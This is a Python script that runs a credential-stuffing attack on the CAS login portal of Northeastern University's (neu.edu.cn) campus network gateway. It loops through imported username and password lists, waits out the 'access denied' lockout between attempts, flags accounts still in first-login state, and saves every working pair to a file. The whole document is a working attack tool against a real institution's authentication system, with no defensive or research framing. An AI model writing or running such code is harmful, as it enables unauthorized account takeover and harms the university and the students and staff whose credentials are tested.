import sys
from requests import get, packages, Session
from bs4 import BeautifulSoup
from id_num import un1,pd1
import time
class Http():
    def __init__(self):
        self.session = Session()
    def login(self,un,pd):
        un=un
        pd=pd

        head={'Referer':'https://pass.neu.edu.cn/tpass/login?service=https%3A%2F%2Fipgw.neu.edu.cn%2Fsrun_cas.php%3Fac_id%3D1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36', }
        information=self.session.get('https://pass.neu.edu.cn/tpass/login?service=https%3A%2F%2Fipgw.neu.edu.cn%2Fsrun_cas.php%3Fac_id%3D1', headers=head)
        default_htmldoc = BeautifulSoup(information.text, "html.parser")

        lt=default_htmldoc.find('input',id='lt')["value"]
        execution=default_htmldoc.find_all('input')[8]["value"]

        form1_data = {
                'rsa': un+pd+lt,
                'ul': len(un),
                'pl': len(pd),
                'lt': lt,
                'execution': execution,
                '_eventId': 'submit'

            }

        information2=self.session.post('https://pass.neu.edu.cn/tpass/login?service=https%3A%2F%2Fipgw.neu.edu.cn%2Fsrun_cas.php%3Fac_id%3D1',
                                                         data=form1_data,
                                                         headers=head)
        default_htmldoc2 = BeautifulSoup(information2.text, "html.parser")
        if default_htmldoc2.find_all('script')[-1].text.strip()=='Util.load($.getParameter("act"));':
            username, deny, lock, Fm1='NewUser','NewUser','NewUser','NewUser'
            return username, deny, lock, Fm1
        else:
            deny=default_htmldoc2.find_all('span')[0].text

            if len(default_htmldoc2.find_all('span'))>10:
                lock =default_htmldoc2.find_all('span')[11]
            else:
                lock=None
            username=default_htmldoc2.find('span',id='user_name')
            Fm1=default_htmldoc2.find('form',id='fm1')
            return username,deny,lock,Fm1

    def logout(self):
         self.session.get('http://ipgw.neu.edu.cn/srun_cas.php?logout', headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36',
        })


length=len(un1)
for x in range(0,length):
    user=un1[x]
    pwd=pd1[x]
    IPgw=Http()
    User,Deny,Lock,Fm1=IPgw.login(user,pwd)
    if Deny=='访问被拒绝':
        print('time wait')
        time.sleep(62)
        IPgw = Http()
        User, Deny, Lock ,Fm1= IPgw.login(user,pwd)
        if User==None and Fm1==None:
            print(str(x)+' '+user + ' failed')
            continue
        else:
            print(str(x)+' '+user+' '+pwd+ ' succeed')
            IPgw.logout()
            with open('succeed.txt', 'a') as f:
                f.write(user+' '+pwd + '\n')
        time.sleep(0.8)
    elif User=='NewUser' and Fm1=='NewUser' and Deny=='NewUser'and Fm1=='NewUser':
        print(str(x)+' '+user+' '+pwd+' NewUser')
        with open('succeed.txt', 'a') as f:
            f.write(user + ' ' + pwd + ' ' +'NewUser'+ '\n')
    else:
        if User==None and Fm1==None:
            print(str(x)+' '+user + ' failed')
            continue
        else:
            print(str(x)+' '+user+' '+pwd+ ' succeed')
            IPgw.logout()
            with open('succeed.txt', 'a') as f:
                f.write(user+' '+pwd + '\n')
        time.sleep(0.8)
